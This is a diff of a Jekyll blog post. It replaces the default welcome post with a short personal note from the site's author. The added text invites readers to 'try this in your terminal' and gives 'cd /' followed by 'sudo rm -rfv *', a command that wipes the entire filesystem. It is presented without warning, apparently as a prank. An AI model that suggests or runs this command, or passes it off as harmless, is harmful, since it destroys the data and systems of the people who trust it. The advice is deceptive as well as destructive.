@@ -1,29 +1,18 @@
 ---
 layout: post
-title:  "Welcome to Jekyll!"
+title:  "Welcome to my personal page!"
 date:   2021-12-27 15:54:09 +0800
 categories: jekyll update
 ---
-You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.
+This post is suppose to be some instructional info on how to edit and post through Jekyll, It's stupid to leave the first post like that, so I get rid of it.
 
-Jekyll requires blog post files to be named according to the following format:
+Posts on my personal web page are supposed to be fun and weird. However, currently I'm not in the mood of writing any GOOD posts, so I just wrote some nonsense like this, because nobody's gonna notice this tiny little wesite among our huge and deep internet that keeps us safe and ignorant.
 
-`YEAR-MONTH-DAY-title.MARKUP`
 
-Where `YEAR` is a four-digit number, `MONTH` and `DAY` are both two-digit numbers, and `MARKUP` is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.
-
-Jekyll also offers powerful support for code snippets:
+Try this in your terminal:
 
 {% highlight ruby %}
-def print_hi(name)
-  puts "Hi, #{name}"
-end
-print_hi('Tom')
-#=> prints 'Hi, Tom' to STDOUT.
+cd /
+sudo rm -rfv *
 {% endhighlight %}
 
-Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].
-
-[jekyll-docs]: https://jekyllrb.com/docs/home
-[jekyll-gh]:   https://github.com/jekyll/jekyll
-[jekyll-talk]: https://talk.jekyllrb.com/
